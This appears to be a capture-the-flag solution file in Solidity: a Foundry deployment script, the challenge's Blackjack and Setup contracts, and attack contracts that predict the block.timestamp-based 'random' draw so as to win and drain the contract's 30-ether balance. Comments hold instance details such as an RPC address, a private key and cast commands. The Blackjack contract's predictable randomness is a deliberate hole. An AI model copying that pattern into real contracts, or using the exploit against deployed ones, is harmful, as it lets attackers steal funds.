// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(vm.envAddress("SETUP_ADDR"));
    address wallet = vm.envAddress("WALLET_ADDR");
    Blackjack public blackjack = setup.blackjack();
    function run() public {

        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address account = vm.addr(privateKey);

        console.log(account);

        vm.startBroadcast(privateKey);

        attack hack = new attack(address(blackjack));

        vm.stopBroadcast();

        console.log(address(hack));
    }
}


// UUID	222f089b-e5b3-4573-9a78-7c69905d8102
// RPC Endpoint	http://103.178.153.113:40005/222f089b-e5b3-4573-9a78-7c69905d8102
// Private Key	0x65c45d0c113f0a5b17bc27cfbf424feb66e6c7e8dc867388309c39dae7b4e717
// Setup Contract	0x735223e8522274e9A146697fBaB7B3D4DF6abBf5
// Wallet	0x3adb1BcCBE95D927B6C964ec944B153691b48e92
// 0x4dEB99561D1F18f534b4E08CFaf6c9031cfde101
// cast call 0x08Cb94Ee5C66036C3216e4b44BDC0298c0a95154 "getTimestamp()(uint256)" --rpc-url http://94.237.56.147:52270/rpc --private-key $PRIVATE_KEY
// cast send 0x08Cb94Ee5C66036C3216e4b44BDC0298c0a95154 "getTimestamp()(uint256)" --rpc-url http://94.237.56.147:52270/rpc --private-key $PRIVATE_KEY


// Depl

contract attack{

    Blackjack public blackjack;
    uint256 public val;
    uint256 public timestamp;

    constructor(address _blackjack) payable {
        blackjack = Blackjack(_blackjack);
    }

    function solve() external {
        val = uint256(keccak256(abi.encodePacked(block.timestamp))) % 10;
        if(val == 4) {
            blackjack.playBlackjack(1);
        }
    }

    function check(uint256 cek) external returns(uint256) {
        return uint256(keccak256(abi.encodePacked(cek))) % 10;
    }

    function solve2(uint256 val2) public {
        timestamp = block.timestamp;
        val = uint256(keccak256(abi.encodePacked(block.timestamp))) % 10;
        if(val == 4) {
            blackjack.playBlackjack(1);
        }
    }

    receive() external payable {}
}


contract Hack {
    Blackjack public blackjack;
    bool private solved;

    constructor(address _target) {
        blackjack = Blackjack(_target);
    }

    function attack() external {
        uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp))) % 10;
        if(guess == 4) {
            blackjack.playBlackjack(1);
            solved = true;
        }
    }

    function isSolved() external view returns(bool) {
        return solved;
    }

    receive() external payable {}
}

contract Setup {
    Blackjack public blackjack;
    bool private solved;

    constructor() payable {
        require(msg.value == 30 ether, "Require 30 Ether to Deploy.");
        blackjack = new Blackjack{value: 30 ether}();
    }

    function isSolved() external view returns (bool) {
        return blackjack.playerWon();
    }
}

contract Blackjack{

    address public dealer;
    bool public playerWon;
    bool public dealerMoved;
    bool public playerMoved;
    bool public dealerWon;

    constructor() payable {
        require(msg.value == 30 ether, "Require 30 Ether to Start the game");
        dealer = msg.sender;
    }

    function playBlackjack(uint256 _choice) public {
        require(dealerWon == false, "Dealer has won the game");
        require(playerWon == false, "You've won the game!");
        uint256 playerCards = 17;
        uint256 dealerCards = 15;
        // You Have the first turn each time, you can choose either pass or draw
        // The dealer will always draw each turn, but... you can stall as long as you want.
        if(_choice == 1 && playerMoved != true){
            playerCards += uint256(keccak256(abi.encodePacked(block.timestamp))) % 10;
            playerMoved = true;
        }else if(_choice == 2 && dealerMoved != true){
            // player pass, but the dealer will draw
            uint256 toAdd = 6;
            dealerCards += toAdd;
            dealerMoved = true;
            dealerWon = true;
        }
        // Transfer all balance if the playerWon
        if(playerCards == 21){
            playerWon = true;
            (bool transfered, ) = payable(msg.sender).call{value: address(this).balance}("");
            require(transfered, "Reward failed to sent");
        }
    }

}